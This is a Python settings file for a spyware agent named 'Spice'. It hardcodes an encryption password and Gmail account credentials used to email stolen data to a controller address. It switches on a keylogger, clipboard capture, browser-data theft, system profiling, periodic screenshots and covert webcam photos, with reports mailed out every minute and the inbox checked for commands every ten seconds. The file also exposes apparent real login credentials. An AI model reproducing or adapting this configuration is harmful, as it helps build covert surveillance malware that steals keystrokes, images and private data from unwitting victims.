#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Zunayed Hassan'

from os.path import expanduser

# Spyware agent identity related settings
AGENT_NAME                  = "Spice"
AGENT_LOCATION              = (expanduser("~") + "\\AppData\\Roaming\\" + AGENT_NAME + "\\")
REPORT_LOCATION             = AGENT_LOCATION + "Report\\"
VERSION                     = "1.0"

ENCRYPTION_PASSWORD          = "black_flag"
AGENT_EMAIL_ADDRESS          = "darkspice2013@gmail.com"
AGENT_EMAIL_PASSWORD         = "zhp.dkspc"
AGENT_HQ_EMAIL_ADDRESSES     = [ "carelesswhisperbd@gmail.com" ]
AGENT_EMAIL_SENDING_SERVER   = "smtp.gmail.com:587"
AGENT_EMAIL_RECEIVING_SERVER = "pop.gmail.com"
AGENT_EMAIL_RECEIVING_PORT   = 995

# Agent report related settings
KEY_LOGGER_REPORT_FILE_NAME  = REPORT_LOCATION + "keylogger_report.txt"
CLIPBOARD_COPIER_FILE_NAME   = REPORT_LOCATION + "clipboard_report.txt"
WEB_BROWSER_DIGGER_FILE_NAME = REPORT_LOCATION + "web_browser_report.txt"
SYSTEM_INFORMATION_FILE_NAME = REPORT_LOCATION + "system_information.txt"

# Spyware feature related settings
RUN_KEYLOGGER          = True
RUN_CLIPBOARD_COPIER   = True
RUN_SCREENSHOT_TAKER   = True
RUN_WEB_BROWSER_DIGGER = True
RUN_SYSTEM_INFORMATION = True
RUN_WEBCAM_IMAGE_TAKER = True
RUN_REPORTER           = True

# Spyware component related settings
SCREENSHOT_TAKER_INTERVAL       = 300      # Seconds
SCREENSHOT_TAKER_IMAGE_FORMAT   = ".png"

# Web browser digger related settings
WEB_BROWSER_DIGGER_INTERVAL     = 120      # Seconds

# Webcam image taker related settings
WEBCAM_IMAGE_TAKING_INTERVAL    = 120      # Seconds
WEBCAM_IMAGE_TAKER_IMAGE_FORMAT = ".jpg"

# Reporter related settings
REPORTER_REPORT_TIME_INTERVAL   = 180      # Seconds

# Email sending related settings
EMAIL_SENDING_INTERVAL          = 60       # Seconds

# Email receiving related settings
EMAIL_CHECKING_INTERVAL         = 10       # Seconds